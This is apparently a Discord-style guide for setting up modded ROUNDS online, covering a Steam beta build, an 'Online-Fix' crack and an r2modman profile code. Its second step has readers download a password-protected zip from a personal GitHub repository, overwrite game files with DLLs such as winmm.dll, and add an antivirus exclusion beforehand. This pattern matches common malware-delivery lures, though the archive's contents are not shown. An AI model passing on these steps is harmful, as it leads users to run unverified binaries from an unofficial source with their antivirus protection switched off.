# 🟠 MODDED ROUNDS — ONLINE SETUP

**Modded 1.1.1 profile · Online-Fix · `old-rounds-for-mods` build**

> Play modded ROUNDS online with the crew — everyone runs the **same profile**, so lobbies don't desync.

> 📦 **Profile:** `01a0de2c-2f18-9acf-b8e3-6e19cd50cfcb` · *Modded 1.1.1*
> 🔑 **Zip password:** `online-fix.me`
> 🎯 **Build:** `old-rounds-for-mods`

-# ─────────────────────────────────
## 1️⃣ Get the Right Build
ROUNDS must be on the **`old-rounds-for-mods`** depot — the current build breaks most mods.
-# Own it on Steam? Library → right-click **ROUNDS** → **Properties → Betas** → pick `old-rounds-for-mods`.

-# ─────────────────────────────────
## 2️⃣ Install the Online-Fix
1. Download → **[📥 ROUNDS-Fix-Repair.zip](https://raw.githubusercontent.com/XevioQwerty/discord-direct/main/downloads/online-fix/ROUNDS-Fix-Repair-6707853.zip)** *(10 MB)*
2. Open the game folder: Steam → right-click **ROUNDS** → **Manage → Browse local files**.
3. Extract **everything** from the zip into that folder → **overwrite** when asked. Password:
```
online-fix.me
```
-# Antivirus may flag `OnlineFix64.dll` / `winmm.dll` — add an exclusion for the ROUNDS folder first.

-# ─────────────────────────────────
## 3️⃣ Import the Mod Profile
1. Install **[r2modman](https://github.com/ebkr/r2modmanPlus/releases/latest)** and select **ROUNDS**.
2. **Import / Update → Import new profile → From code**, then paste:
```
01a0de2c-2f18-9acf-b8e3-6e19cd50cfcb
```
3. Name it **Modded 1.1.1** and let every mod finish downloading.

-# ─────────────────────────────────
## 4️⃣ Play
Keep **Steam open**, then hit **Start modded** in r2modman. Invite friends through the Steam overlay (`Shift + Tab`).

-# ─────────────────────────────────
## 🛠️ Troubleshooting
- **Invites / lobbies not working?** Install Spacewar: press `Win + R` and paste `steam://install/480`
- **Mods not loading?** Launch with **Start modded** in r2modman, not from Steam.
- **Desyncs or missing cards?** Everyone must be on the **same profile code** — re-import if it changes.
